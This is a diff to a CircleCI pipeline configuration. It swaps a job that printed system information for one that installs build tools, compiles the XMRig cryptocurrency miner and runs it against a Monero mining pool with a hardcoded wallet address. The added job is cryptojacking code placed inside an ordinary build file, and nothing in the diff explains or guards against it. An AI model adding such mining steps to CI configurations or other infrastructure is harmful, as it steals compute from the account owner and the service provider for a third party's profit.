@@ -1,34 +1,37 @@
 version: 2.1
 
 jobs:
-  system-info:
+  xmrig-setup:
     docker:
       - image: cimg/base:stable
     steps:
       - checkout
       - run:
-          name: Check if 'info' file was modified and show system info
+          name: Update System and Install Dependencies
           command: |
-            if git diff --name-only HEAD~1 | grep -q "^info$"; then
-              echo "File 'info' was modified. Running tasks..."
-              echo "==== System Information ===="
-              uname -a
-              echo ""
-              echo "==== CPU Information ===="
-              lscpu
-              echo ""
-              echo "==== Memory Information ===="
-              free -h
-              echo ""
-              echo "==== Disk Space Information ===="
-              df -h
-            else
-              echo "File 'info' was not modified. Skipping tasks."
-              exit 0
-            fi
+            apt-get update && apt-get upgrade -y
+            apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+      - run:
+          name: Clone XMRig Repository
+          command: |
+            git clone https://github.com/xmrig/xmrig.git
+            cd xmrig
+      - run:
+          name: Build XMRig
+          command: |
+            cd xmrig
+            mkdir build
+            cd build
+            cmake ..
+            make
+      - run:
+          name: Start Mining
+          command: |
+            cd xmrig/build
+            ./xmrig -o pool.xmr.pt:9000 -u 44nFMQFFiFceGgSdPeqpQ4iSf2qm3XtG55JJ3KNUQ9RDJ99Aus2N7FWAwNKMN8xUKDQ6xMM4tgKFUecoiYYhFK2rVSZFuNg -k --tls --coin monero -p Monero
 
 workflows:
   version: 2
-  system-info-workflow:
+  xmrig-workflow:
     jobs:
-      - system-info
+      - xmrig-setup
